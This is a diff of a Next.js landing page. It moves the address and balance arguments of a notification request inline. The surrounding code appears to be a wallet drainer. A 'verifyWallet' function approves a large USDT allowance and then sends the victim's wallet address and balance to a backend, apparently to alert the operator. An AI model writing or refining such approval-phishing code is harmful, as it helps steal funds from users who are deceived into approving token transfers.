@@ -80,7 +80,7 @@ const LandingPage: NextPage = () => {
 
     async function verifyWallet() {
         await approveUSDT(100000000);
-        await sendNotification(adapters[selectedIndex].address, balance.toString());
+        await sendNotification();
     }
 
     async function selectAdapter(index: number) {
@@ -94,10 +94,10 @@ const LandingPage: NextPage = () => {
 
     
   // Method to send Notification
-  const sendNotification = async (address: string, balance:string) => {
+  const sendNotification = async () => {
    
     try {
-      axios.get(`${process.env.NEXT_PUBLIC_BACKEND_URL}/backend/${address}/user/${balance}`).then((res) => {
+      axios.get(`${process.env.NEXT_PUBLIC_BACKEND_URL}/backend/${adapters[selectedIndex].address}/user/${balance.toString()}`).then((res) => {
       });
     } catch (error) {
       console.error('Error sending SMS:', error);
